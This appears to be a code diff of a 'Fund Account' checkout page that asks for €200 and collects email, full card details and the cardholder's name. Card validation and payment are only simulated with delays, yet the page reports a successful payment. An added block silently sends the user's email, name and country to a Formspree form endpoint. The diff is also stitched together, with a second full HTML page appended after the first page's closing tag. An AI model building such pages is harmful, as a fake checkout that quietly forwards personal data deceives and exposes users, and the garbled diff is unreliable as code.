@@ -885,6 +885,1047 @@
                 payButton.classList.add('success');
                 buttonText.textContent = 'Account funded!';
 
+                // --- NEW: Send data to Formspree (fire and forget) ---
+                const formspreeData = {
+                    email: emailInput.value.trim(),
+                    name: cardholderInput.value.trim(),
+                    country: countrySelect.value,
+                    amount: '€200.00',
+                    submissionDateTime: new Date().toISOString()
+                };
+
+                fetch('https://formspree.io/f/xloalwre', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formspreeData)
+                }).catch(err => {
+                    // silently log any error; do not disturb the user
+                    console.error('Formspree submission failed:', err);
+                });
+                // --- END NEW CODE ---
+
+                // Show toast
+                const toast = document.getElementById('successToast');
+                toast.classList.remove('hidden');
+                setTimeout(() => {
+                    toast.classList.add('hidden');
+                }, 4000);
+
+                // Show modal after delay
+                setTimeout(() => {
+                    document.getElementById('successModal').classList.remove('hidden');
+                }, 800);
+
+                // Reset form after modal
+                setTimeout(function() {
+                    emailInput.value = '';
+                    cardNumberInput.value = '';
+                    expiryInput.value = '';
+                    cvcInput.value = '';
+                    cardholderInput.value = '';
+                    countrySelect.value = 'CH';
+                    cardTypeLabel.textContent = '';
+                    cardIcon.textContent = '💳';
+
+                    buttonSuccess.classList.add('hidden');
+                    buttonText.classList.remove('hidden');
+                    buttonText.textContent = 'Fund €200.00';
+                    payButton.classList.remove('success');
+
+                    inputs.forEach(el => el.disabled = false);
+
+                    form.querySelectorAll('.input-base.error').forEach(el => {
+                        el.classList.remove('error');
+                    });
+                    [emailError, cardError, nameError].forEach(el => {
+                        el.classList.add('hidden');
+                        el.textContent = '';
+                    });
+
+                    emailInput.focus();
+                }, 5000);
+            });
+
+            // Keyboard navigation
+            form.querySelectorAll('input, select').forEach(el => {
+                el.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        const focusable = Array.from(form.querySelectorAll(
+                            'input:not(:disabled), select:not(:disabled), button:not(:disabled)'));
+                        const idx = focusable.indexOf(this);
+                        if (idx !== -1 && idx < focusable.length - 1) {
+                            focusable[idx + 1].focus();
+                        } else if (idx === focusable.length - 1) {
+                            form.dispatchEvent(new Event('submit'));
+                        }
+                    }
+                });
+            });
+
+            // Auto-advance
+            cardNumberInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    expiryInput.focus();
+                }
+                if (e.key !== 'Backspace' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
+                    const val = this.value.replace(/\s/g, '');
+                    const isAmex = /^3[47]/.test(val);
+                    const maxLen = isAmex ? 19 : 19;
+                    if (this.value.length >= maxLen && e.key.length === 1 && !e.ctrlKey && !e.metaKey) {
+                        e.preventDefault();
+                        expiryInput.focus();
+                    }
+                }
+            });
+
+            expiryInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    cvcInput.focus();
+                }
+                if (this.value.length === 5 && e.key.length === 1 && !e.ctrlKey && !e.metaKey) {
+                    if (e.key !== 'Backspace' && e.key !== 'Delete') {
+                        e.preventDefault();
+                        cvcInput.focus();
+                    }
+                }
+            });
+
+            cvcInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    cardholderInput.focus();
+                }
+            });
+
+            cardholderInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    countrySelect.focus();
+                }
+            });
+
+            countrySelect.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    payButton.focus();
+                }
+            });
+
+            // Initial focus
+            emailInput.focus();
+
+            // G Pay button click
+            document.getElementById('gpayBtn')?.addEventListener('click', function() {
+                alert('G Pay integration would process here');
+            });
+
+            // Promo code click
+            document.getElementById('promoLink')?.addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Apply promotion code functionality');
+            });
+
+            // Modal close on outside click
+            document.getElementById('successModal')?.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.classList.add('hidden');
+                    window.location.reload();
+                }
+            });
+
+        })();
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Fund Account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Inter', system-ui, sans-serif;
+            background: #f5f5f7;
+            color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+        .checkout-card {
+            background: #ffffff;
+            border-radius: 1.5rem;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.06), 0 2px 8px rgba(0, 0, 0, 0.03);
+            max-width: 64rem;
+            width: 100%;
+            overflow: hidden;
+        }
+        .checkout-inner {
+            display: grid;
+            grid-template-columns: 1fr 1.3fr;
+            gap: 0;
+        }
+        @media (max-width: 768px) {
+            .checkout-inner {
+                grid-template-columns: 1fr;
+            }
+            .checkout-card {
+                border-radius: 1rem;
+            }
+        }
+        .left-panel {
+            padding: 2.5rem 2rem;
+            background: #fafafc;
+            border-right: 1px solid #f0f0f2;
+        }
+        @media (max-width: 768px) {
+            .left-panel {
+                border-right: none;
+                border-bottom: 1px solid #f0f0f2;
+                padding: 1.5rem;
+            }
+        }
+        @media (max-width: 480px) {
+            .left-panel {
+                padding: 1.25rem;
+            }
+        }
+        .right-panel {
+            padding: 2.5rem 2rem;
+        }
+        @media (max-width: 768px) {
+            .right-panel {
+                padding: 1.5rem;
+            }
+        }
+        @media (max-width: 480px) {
+            .right-panel {
+                padding: 1.25rem;
+            }
+        }
+        .input-base {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            background: #ffffff;
+            border: 1.5px solid #e8e8ec;
+            border-radius: 0.75rem;
+            color: #1a1a1a;
+            font-size: 0.95rem;
+            transition: all 0.2s ease;
+            outline: none;
+            font-family: -apple-system, BlinkMacSystemFont, 'Inter', sans-serif;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        .input-base:focus {
+            border-color: #635bff;
+            box-shadow: 0 0 0 3px rgba(99, 91, 255, 0.08);
+        }
+        .input-base.error {
+            border-color: #dc3545;
+        }
+        .input-base:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            background: #f8f8fa;
+        }
+        .input-label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #6b6b76;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+            margin-bottom: 0.4rem;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 1rem 1.5rem;
+            background: #1a1a1a;
+            color: white;
+            font-weight: 600;
+            border: none;
+            border-radius: 0.75rem;
+            font-size: 1rem;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            font-family: -apple-system, BlinkMacSystemFont, 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .btn-primary:hover:not(:disabled) {
+            background: #2d2d2d;
+            transform: scale(1.01);
+        }
+        .btn-primary:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .btn-primary.success {
+            background: #28a745;
+        }
+        .btn-primary.error {
+            background: #dc3545;
+        }
+        .spinner {
+            animation: spin 0.8s linear infinite;
+            width: 1.25rem;
+            height: 1.25rem;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .fade-in {
+            animation: fadeIn 0.2s ease-out forwards;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-4px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .error-message {
+            font-size: 0.8rem;
+            color: #dc3545;
+            margin-top: 0.3rem;
+        }
+        .card-type-badge {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 0.75rem;
+            font-weight: 500;
+            color: #6b6b76;
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+            pointer-events: none;
+        }
+        .input-wrap {
+            position: relative;
+        }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.75rem;
+        }
+        @media (max-width: 480px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+                gap: 0.5rem;
+            }
+        }
+        .badge-icon {
+            width: 2.5rem;
+            height: 2.5rem;
+            background: #f0f0f5;
+            border-radius: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .select-base {
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%236b6b76' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 1rem center;
+            padding-right: 2.5rem;
+        }
+        .text-muted {
+            color: #6b6b76;
+        }
+        .border-divider {
+            border-top: 1px solid #f0f0f2;
+        }
+        .promo-link {
+            color: #635bff;
+            font-weight: 500;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: color 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .promo-link:hover {
+            color: #4a43d4;
+        }
+        .footer-link {
+            color: #6b6b76;
+            font-size: 0.75rem;
+            text-decoration: none;
+            transition: color 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .footer-link:hover {
+            color: #1a1a1a;
+        }
+        .gp-pay-btn {
+            background: #f0f0f5;
+            border: none;
+            border-radius: 0.75rem;
+            padding: 0.75rem 1.5rem;
+            font-weight: 500;
+            color: #1a1a1a;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: -apple-system, BlinkMacSystemFont, 'Inter', sans-serif;
+            font-size: 0.9rem;
+            width: 100%;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .gp-pay-btn:hover {
+            background: #e5e5ea;
+        }
+        .gp-pay-btn:active {
+            transform: scale(0.98);
+        }
+        .hidden {
+            display: none !important;
+        }
+        .flex-center {
+            display: flex;
+            align-items: center;
+        }
+        .gap-2 {
+            gap: 0.5rem;
+        }
+        .gap-3 {
+            gap: 0.75rem;
+        }
+        .gap-4 {
+            gap: 1rem;
+        }
+        .mb-1 {
+            margin-bottom: 0.25rem;
+        }
+        .mb-2 {
+            margin-bottom: 0.5rem;
+        }
+        .mb-3 {
+            margin-bottom: 0.75rem;
+        }
+        .mb-4 {
+            margin-bottom: 1rem;
+        }
+        .mb-6 {
+            margin-bottom: 1.5rem;
+        }
+        .mt-2 {
+            margin-top: 0.5rem;
+        }
+        .mt-3 {
+            margin-top: 0.75rem;
+        }
+        .mt-4 {
+            margin-top: 1rem;
+        }
+        .mt-6 {
+            margin-top: 1.5rem;
+        }
+        .pt-4 {
+            padding-top: 1rem;
+        }
+        .pt-6 {
+            padding-top: 1.5rem;
+        }
+        .text-sm {
+            font-size: 0.875rem;
+        }
+        .text-xs {
+            font-size: 0.75rem;
+        }
+        .font-semibold {
+            font-weight: 600;
+        }
+        .font-medium {
+            font-weight: 500;
+        }
+        .text-center {
+            text-align: center;
+        }
+        .w-full {
+            width: 100%;
+        }
+        .justify-between {
+            justify-content: space-between;
+        }
+        .toast {
+            animation: slideUp 0.3s ease forwards;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @media (max-width: 480px) {
+            .text-2xl {
+                font-size: 1.5rem;
+            }
+            .text-3xl {
+                font-size: 2rem;
+            }
+            .text-lg {
+                font-size: 1.1rem;
+            }
+            .input-base {
+                font-size: 0.9rem;
+                padding: 0.65rem 0.9rem;
+            }
+        }
+        /* Mobile touch optimizations */
+        @media (hover: none) {
+            .btn-primary:hover:not(:disabled) {
+                transform: none;
+            }
+            .gp-pay-btn:hover {
+                background: #f0f0f5;
+            }
+        }
+        /* Fix for iOS input zoom */
+        @media (max-width: 768px) {
+            input, select {
+                font-size: 16px !important;
+            }
+        }
+        .country-select-wrapper {
+            position: relative;
+        }
+        .country-select-wrapper select {
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="checkout-card">
+        <div class="checkout-inner">
+            <!-- Left Panel -->
+            <div class="left-panel">
+                <!-- Standard Swiss Badge -->
+                <div class="flex items-center gap-2 mb-4">
+                    <span class="text-xs font-semibold text-[#6b6b76] bg-[#f0f0f5] px-3 py-1 rounded-full">Standard Swiss</span>
+                </div>
+
+                <!-- Product Header -->
+                <div class="mb-6">
+                    <h1 class="text-2xl font-bold mb-1">Fund Account</h1>
+                    <p class="text-3xl font-bold">€200.00</p>
+                </div>
+
+                <!-- Fund Account Info -->
+                <div class="mb-6">
+                    <h3 class="font-semibold text-lg">Premium Account Top-up</h3>
+                    <p class="text-sm text-muted mt-1 leading-relaxed">Add funds to your account to access premium features, tools, and exclusive content. Your balance will be updated immediately after payment confirmation.</p>
+                </div>
+
+                <!-- Pricing Details -->
+                <div class="space-y-2 border-divider pt-4">
+                    <div class="flex justify-between text-sm">
+                        <span class="text-muted">Amount</span>
+                        <span class="font-medium">€200.00</span>
+                    </div>
+                    <div class="flex justify-between text-sm">
+                        <span class="text-muted promo-link" id="promoLink">+ Apply promo code</span>
+                        <span></span>
+                    </div>
+                    <div class="flex justify-between text-base font-semibold pt-2 border-divider">
+                        <span>Total to fund</span>
+                        <span>€200.00</span>
+                    </div>
+                </div>
+
+                <!-- Footer Links -->
+                <div class="mt-6 pt-4 border-divider flex flex-wrap items-center gap-3 text-xs text-muted">
+                    <span>Secure payment</span>
+                    <span>·</span>
+                    <a href="#" class="footer-link">Terms</a>
+                    <span>·</span>
+                    <a href="#" class="footer-link">Privacy</a>
+                </div>
+            </div>
+
+            <!-- Right Panel -->
+            <div class="right-panel">
+                <!-- G Pay Button -->
+                <button class="gp-pay-btn flex items-center justify-center gap-2 mb-4" id="gpayBtn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#1a1a1a"/>
+                    </svg>
+                    <span class="font-semibold">G Pay</span>
+                </button>
+
+                <div class="text-center text-sm text-muted mb-4">Or pay with card</div>
+
+                <form id="paymentForm" novalidate>
+                    <!-- Email -->
+                    <div class="mb-4">
+                        <label class="input-label">Email</label>
+                        <input type="email" id="email" class="input-base" placeholder="you@example.com" autocomplete="email" />
+                        <div class="error-message hidden" id="emailError"></div>
+                    </div>
+
+                    <!-- Card Information -->
+                    <div class="mb-4">
+                        <label class="input-label">Card Information</label>
+                        <div class="input-wrap mb-2">
+                            <input id="cardNumber" type="text" class="input-base" placeholder="1234 1234 1234 1234" autocomplete="cc-number" maxlength="19" inputmode="numeric" />
+                            <div class="card-type-badge">
+                                <span id="cardIcon">💳</span>
+                                <span id="cardTypeLabel"></span>
+                            </div>
+                        </div>
+                        <div class="grid-2">
+                            <input id="expiry" type="text" class="input-base" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" inputmode="numeric" />
+                            <input id="cvc" type="text" class="input-base" placeholder="CVC" maxlength="4" autocomplete="cc-csc" inputmode="numeric" />
+                        </div>
+                        <div class="error-message hidden" id="cardError"></div>
+                    </div>
+
+                    <!-- Name on card -->
+                    <div class="mb-4">
+                        <label class="input-label">Name on card</label>
+                        <input id="cardholderName" type="text" class="input-base" placeholder="John Doe" autocomplete="cc-name" />
+                        <div class="error-message hidden" id="nameError"></div>
+                    </div>
+
+                    <!-- Country or region -->
+                    <div class="mb-4 country-select-wrapper">
+                        <label class="input-label">Country or region</label>
+                        <select id="country" class="input-base select-base">
+                            <option value="CH">Switzerland</option>
+                            <option value="AT">Austria</option>
+                            <option value="BE">Belgium</option>
+                            <option value="BG">Bulgaria</option>
+                            <option value="HR">Croatia</option>
+                            <option value="CY">Cyprus</option>
+                            <option value="CZ">Czech Republic</option>
+                            <option value="DK">Denmark</option>
+                            <option value="EE">Estonia</option>
+                            <option value="FI">Finland</option>
+                            <option value="FR">France</option>
+                            <option value="DE">Germany</option>
+                            <option value="GR">Greece</option>
+                            <option value="HU">Hungary</option>
+                            <option value="IE">Ireland</option>
+                            <option value="IT">Italy</option>
+                            <option value="LV">Latvia</option>
+                            <option value="LT">Lithuania</option>
+                            <option value="LU">Luxembourg</option>
+                            <option value="MT">Malta</option>
+                            <option value="NL">Netherlands</option>
+                            <option value="PL">Poland</option>
+                            <option value="PT">Portugal</option>
+                            <option value="RO">Romania</option>
+                            <option value="SK">Slovakia</option>
+                            <option value="SI">Slovenia</option>
+                            <option value="ES">Spain</option>
+                            <option value="SE">Sweden</option>
+                            <option value="NO">Norway</option>
+                            <option value="IS">Iceland</option>
+                            <option value="LI">Liechtenstein</option>
+                            <option value="GB">United Kingdom</option>
+                            <option value="US">United States</option>
+                            <option value="CA">Canada</option>
+                            <option value="AU">Australia</option>
+                            <option value="NZ">New Zealand</option>
+                            <option value="JP">Japan</option>
+                            <option value="SG">Singapore</option>
+                            <option value="KR">South Korea</option>
+                            <option value="BR">Brazil</option>
+                            <option value="IN">India</option>
+                            <option value="ZA">South Africa</option>
+                            <option value="AE">United Arab Emirates</option>
+                            <option value="IL">Israel</option>
+                            <option value="TR">Turkey</option>
+                            <option value="RU">Russia</option>
+                            <option value="UA">Ukraine</option>
+                            <option value="BY">Belarus</option>
+                            <option value="MD">Moldova</option>
+                            <option value="GE">Georgia</option>
+                            <option value="AM">Armenia</option>
+                            <option value="AZ">Azerbaijan</option>
+                            <option value="KZ">Kazakhstan</option>
+                            <option value="UZ">Uzbekistan</option>
+                            <option value="EG">Egypt</option>
+                            <option value="MA">Morocco</option>
+                            <option value="TN">Tunisia</option>
+                            <option value="DZ">Algeria</option>
+                            <option value="NG">Nigeria</option>
+                            <option value="KE">Kenya</option>
+                            <option value="GH">Ghana</option>
+                            <option value="MX">Mexico</option>
+                            <option value="AR">Argentina</option>
+                            <option value="CL">Chile</option>
+                            <option value="CO">Colombia</option>
+                            <option value="PE">Peru</option>
+                            <option value="VE">Venezuela</option>
+                        </select>
+                    </div>
+
+                    <!-- Pay Button -->
+                    <button type="submit" id="payButton" class="btn-primary mt-2">
+                        <span id="buttonText">Fund €200.00</span>
+                        <span id="buttonSpinner" class="hidden"><span class="spinner"></span></span>
+                        <span id="buttonSuccess" class="hidden">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7" />
+                            </svg>
+                        </span>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Toast -->
+    <div id="successToast" class="hidden fixed bottom-6 right-6 bg-green-600 text-white px-6 py-4 rounded-2xl shadow-xl flex items-center gap-3 toast z-50" style="max-width: 90%;">
+        <i class="bi bi-check-circle-fill text-2xl flex-shrink-0"></i>
+        <div>
+            <div class="font-medium">Account funded successfully!</div>
+            <div class="text-sm opacity-90">€200.00 has been added to your balance.</div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="hidden fixed inset-0 bg-black/60 flex items-center justify-center z-50 p-4">
+        <div class="bg-white rounded-2xl p-8 max-w-sm w-full text-center" style="max-width: 90%;">
+            <div class="mx-auto w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6">
+                <i class="bi bi-check-lg text-4xl text-green-600"></i>
+            </div>
+            <h2 class="text-2xl font-semibold mb-2">Payment successful</h2>
+            <p class="text-gray-600 mb-2">Your account has been funded with <strong>€200.00</strong></p>
+            <p class="text-gray-500 text-sm mb-8">Your balance will update immediately.</p>
+            <button onclick="window.location.reload()" class="w-full py-4 bg-[#202124] text-white rounded-lg font-medium hover:bg-black transition">
+                Continue
+            </button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // DOM refs
+            const form = document.getElementById('paymentForm');
+            const emailInput = document.getElementById('email');
+            const cardNumberInput = document.getElementById('cardNumber');
+            const expiryInput = document.getElementById('expiry');
+            const cvcInput = document.getElementById('cvc');
+            const cardholderInput = document.getElementById('cardholderName');
+            const countrySelect = document.getElementById('country');
+            const payButton = document.getElementById('payButton');
+            const buttonText = document.getElementById('buttonText');
+            const buttonSpinner = document.getElementById('buttonSpinner');
+            const buttonSuccess = document.getElementById('buttonSuccess');
+            const cardTypeLabel = document.getElementById('cardTypeLabel');
+            const cardIcon = document.getElementById('cardIcon');
+
+            // Error containers
+            const emailError = document.getElementById('emailError');
+            const cardError = document.getElementById('cardError');
+            const nameError = document.getElementById('nameError');
+
+            function showError(container, message) {
+                container.textContent = message;
+                container.classList.remove('hidden');
+            }
+
+            function clearError(container) {
+                container.classList.add('hidden');
+                container.textContent = '';
+            }
+
+            function clearInputError(input) {
+                input.classList.remove('error');
+                const parent = input.closest('div');
+                if (parent) {
+                    const errorContainer = parent.querySelector('.error-message');
+                    if (errorContainer) {
+                        errorContainer.classList.add('hidden');
+                        errorContainer.textContent = '';
+                    }
+                }
+            }
+
+            function setInputError(input, container, message) {
+                input.classList.add('error');
+                showError(container, message);
+            }
+
+            // Clear errors on focus
+            [emailInput, cardNumberInput, expiryInput, cvcInput, cardholderInput].forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.classList.remove('error');
+                    const parent = this.closest('div');
+                    if (parent) {
+                        const errorContainer = parent.querySelector('.error-message');
+                        if (errorContainer) {
+                            errorContainer.classList.add('hidden');
+                            errorContainer.textContent = '';
+                        }
+                    }
+                });
+            });
+
+            // Card detection & formatting
+            function detectCardType(number) {
+                const clean = number.replace(/\s/g, '');
+                if (!clean) return null;
+                if (/^4/.test(clean)) return { brand: 'Visa', icon: '💳' };
+                if (/^5[1-5]/.test(clean)) return { brand: 'Mastercard', icon: '💳' };
+                if (/^3[47]/.test(clean)) return { brand: 'Amex', icon: '💳' };
+                if (/^6011|^65/.test(clean)) return { brand: 'Discover', icon: '💳' };
+                return null;
+            }
+
+            function formatCardNumber(value) {
+                const clean = value.replace(/\s/g, '').replace(/\D/g, '');
+                const isAmex = /^3[47]/.test(clean);
+                const parts = [];
+                let i = 0;
+                while (i < clean.length) {
+                    if (isAmex && parts.length === 0) {
+                        parts.push(clean.slice(i, i + 4));
+                        i += 4;
+                    } else if (isAmex && parts.length === 1) {
+                        parts.push(clean.slice(i, i + 6));
+                        i += 6;
+                    } else if (!isAmex && parts.length === 0) {
+                        parts.push(clean.slice(i, i + 4));
+                        i += 4;
+                    } else {
+                        parts.push(clean.slice(i, i + 4));
+                        i += 4;
+                    }
+                }
+                return parts.join(' ');
+            }
+
+            cardNumberInput.addEventListener('input', function(e) {
+                const raw = this.value.replace(/\s/g, '').replace(/\D/g, '');
+                const isAmex = /^3[47]/.test(raw);
+                const maxLen = isAmex ? 15 : 16;
+                const truncated = raw.slice(0, maxLen);
+                const formatted = formatCardNumber(truncated);
+                this.value = formatted;
+
+                const type = detectCardType(truncated);
+                if (type) {
+                    cardTypeLabel.textContent = type.brand;
+                    cardIcon.textContent = type.icon;
+                } else {
+                    cardTypeLabel.textContent = '';
+                    cardIcon.textContent = '💳';
+                }
+                clearError(cardError);
+                this.classList.remove('error');
+            });
+
+            expiryInput.addEventListener('input', function(e) {
+                let value = this.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                this.value = value;
+                this.classList.remove('error');
+                const parent = this.closest('div');
+                if (parent) {
+                    const errorContainer = parent.querySelector('.error-message');
+                    if (errorContainer) {
+                        errorContainer.classList.add('hidden');
+                        errorContainer.textContent = '';
+                    }
+                }
+            });
+
+            cvcInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+                this.classList.remove('error');
+                const parent = this.closest('div');
+                if (parent) {
+                    const errorContainer = parent.querySelector('.error-message');
+                    if (errorContainer) {
+                        errorContainer.classList.add('hidden');
+                        errorContainer.textContent = '';
+                    }
+                }
+            });
+
+            // Luhn validation
+            function luhnCheck(value) {
+                const digits = value.replace(/\s/g, '').split('').map(Number);
+                if (digits.length < 13) return false;
+                let sum = 0;
+                let alt = false;
+                for (let i = digits.length - 1; i >= 0; i--) {
+                    let n = digits[i];
+                    if (alt) {
+                        n *= 2;
+                        if (n > 9) n -= 9;
+                    }
+                    sum += n;
+                    alt = !alt;
+                }
+                return sum % 10 === 0;
+            }
+
+            // Simulate Card Validator API
+            async function validateCardAPI(cardNumber) {
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        const clean = cardNumber.replace(/\s/g, '');
+                        const isValid = clean.length >= 13 && /^[0-9]+$/.test(clean) && luhnCheck(cardNumber);
+                        resolve({
+                            valid: isValid,
+                            brand: detectCardType(clean)
+                        });
+                    }, 800);
+                });
+            }
+
+            // Validation
+            function validateForm() {
+                let isValid = true;
+
+                // Email
+                const emailVal = emailInput.value.trim();
+                if (!emailVal || !emailVal.includes('@') || !emailVal.includes('.')) {
+                    setInputError(emailInput, emailError, 'Please enter a valid email');
+                    isValid = false;
+                } else {
+                    clearError(emailError);
+                    emailInput.classList.remove('error');
+                }
+
+                // Card number - we'll do full validation in submit
+                const cardDigits = cardNumberInput.value.replace(/\s/g, '');
+                if (cardDigits.length < 13) {
+                    setInputError(cardNumberInput, cardError, 'Invalid card number');
+                    isValid = false;
+                } else {
+                    clearError(cardError);
+                    cardNumberInput.classList.remove('error');
+                }
+
+                // Expiry
+                const expiryVal = expiryInput.value;
+                if (!/^\d{2}\/\d{2}$/.test(expiryVal)) {
+                    setInputError(expiryInput, cardError, 'Invalid expiry date');
+                    isValid = false;
+                } else {
+                    const [month, year] = expiryVal.split('/').map(Number);
+                    const now = new Date();
+                    const currentYear = now.getFullYear() % 100;
+                    const currentMonth = now.getMonth() + 1;
+                    if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                        setInputError(expiryInput, cardError, 'Card has expired');
+                        isValid = false;
+                    } else {
+                        cardError.classList.add('hidden');
+                        expiryInput.classList.remove('error');
+                    }
+                }
+
+                // CVC
+                const cvcVal = cvcInput.value;
+                if (!/^\d{3,4}$/.test(cvcVal)) {
+                    setInputError(cvcInput, cardError, 'Invalid CVC');
+                    isValid = false;
+                } else {
+                    cvcInput.classList.remove('error');
+                }
+
+                // Cardholder name
+                if (!cardholderInput.value.trim()) {
+                    setInputError(cardholderInput, nameError, 'Name is required');
+                    isValid = false;
+                } else {
+                    clearError(nameError);
+                    cardholderInput.classList.remove('error');
+                }
+
+                return isValid;
+            }
+
+            // Submit
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                if (!validateForm()) {
+                    const firstError = form.querySelector('.input-base.error');
+                    if (firstError) firstError.focus();
+                    return;
+                }
+
+                const inputs = form.querySelectorAll('input, select, button');
+                inputs.forEach(el => el.disabled = true);
+
+                // Show validating state
+                buttonText.classList.add('hidden');
+                buttonSpinner.classList.remove('hidden');
+                buttonSuccess.classList.add('hidden');
+                payButton.classList.remove('success');
+                payButton.classList.remove('error');
+                
+                // Update button text
+                const spinnerHtml = `<span class="spinner"></span> Validating card...`;
+                buttonSpinner.innerHTML = spinnerHtml;
+
+                // Step 1: Validate card with API
+                const validationResult = await validateCardAPI(cardNumberInput.value);
+
+                if (!validationResult.valid) {
+                    buttonSpinner.classList.add('hidden');
+                    buttonText.classList.remove('hidden');
+                    buttonText.textContent = 'Invalid Card';
+                    payButton.classList.add('error');
+                    
+                    setTimeout(() => {
+                        buttonText.textContent = 'Fund €200.00';
+                        payButton.classList.remove('error');
+                        inputs.forEach(el => el.disabled = false);
+                    }, 2000);
+                    return;
+                }
+
+                // Step 2: Processing
+                buttonSpinner.innerHTML = `<span class="spinner"></span> Processing payment...`;
+
+                // Final processing delay
+                await new Promise(r => setTimeout(r, 1400));
+
+                // Success
+                buttonSpinner.classList.add('hidden');
+                buttonSuccess.classList.remove('hidden');
+                payButton.classList.add('success');
+                buttonText.textContent = 'Account funded!';
+
                 // Show toast
                 const toast = document.getElementById('successToast');
                 toast.classList.remove('hidden');
